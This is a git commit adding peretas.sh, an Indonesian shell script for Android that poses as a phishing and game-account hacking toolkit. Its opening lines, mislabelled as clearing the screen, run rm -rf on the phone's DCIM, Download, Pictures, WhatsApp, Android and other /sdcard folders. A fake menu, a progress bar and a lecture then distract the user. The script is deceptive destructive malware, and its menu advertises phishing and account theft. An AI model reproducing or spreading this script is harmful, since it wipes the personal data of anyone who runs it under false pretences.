7b1d1613bd5534503c7e854305512a3f62ae8cc8
BuangIDX <90441398+BuangIDX@users.noreply.github.com>
2021-09-12 01:29:40 +0700

    Add files via upload

---
+++ peretas.sh
@@ -0,0 +1,109 @@
+#!/system/xbin/bash
+#AUTHOR:BUANGidx
+#Github:https://github.com/BUANGIDX
+#Bersihkan Layar
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+rm -rf KAWAI3
+rm -rf Vidio
+blue='\e[1;34m'
+green='\e[1;32m'
+purple='\[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+sleep 3
+echo "\033[32;1m
+#################################
+#-AUTHOR= CARI DI GOOGLE        #
+#-INSTAGRAM=NO IG.              #
+#-Team=NO TEAM.                 #
+#################################
+"
+sleep 1
+
+echo "\033[32;1mTULIS= phising game! "
+read p;
+
+sleep 2
+
+echo "\033[32;1m
+#-KUMPULAN phising game NO ROOT-#
+______________________________
+|1.phising semua game        |
+|2.sadap Wa                  |
+|3.phising free fire         |
+|4.phising codm              |
+|5.phising ml                |
+|6.phising coc               |
+|7.phising pb                |
+|8.phis akun facebook        |
+|9.phis akun instagram       |
+|10.akun gratis all game     |
+|11.phising game             |
+|12.buat link phising        |
+|13.phising akun sosmed      |
+|14.hack akun masal          |
+|15.script phisng            |
+|16.hack akun free fire      |
+|17.hack akun pubg           |
+|18.hack akun pb             |
+|19.Hack akun game all       |
+|20.perusak Hp Orang         |
+|____________________________|
+"
+echo "\033[32;1mPilih No : "
+read p;
+
+sleep 2
+echo "Sabar Yah butuh proses..."
+echo "\033[34;1m#10%"
+sleep 1
+echo "##20%"
+sleep 1
+echo "###30%"
+sleep 2
+echo "####40%"
+sleep 2
+echo "#####50%"
+sleep 2
+echo "######60%"
+sleep 2
+echo "#######70%"
+sleep 4
+echo "########80%"
+sleep 3
+echo "#########90%"
+sleep 4
+echo "##########100%"
+sleep 3
+echo "_____________________________________"
+sleep 2
+echo "Dengerin Pesan Dari Gw"
+sleep 2
+echo "Menjadi seorang hacker"
+sleep 2
+echo "memerlukan disiplin tinggi"
+sleep 2
+echo "Butuh Kesabaran"
+sleep 2
+echo "dalam memecahkan coding yang rumit"
+sleep 2
+figlet -f eyes "Paham Kan!!!!!" | lolcat
+echo "
+echo "×××××××××××××××××××××××"
+sleep 2
+toilet -f standard -F gay "SALAM"
+sleep 1
+toilet -f standard -F gay "DARI"
+sleep 1
+toilet -f standard -F gay "BUANGIDX"
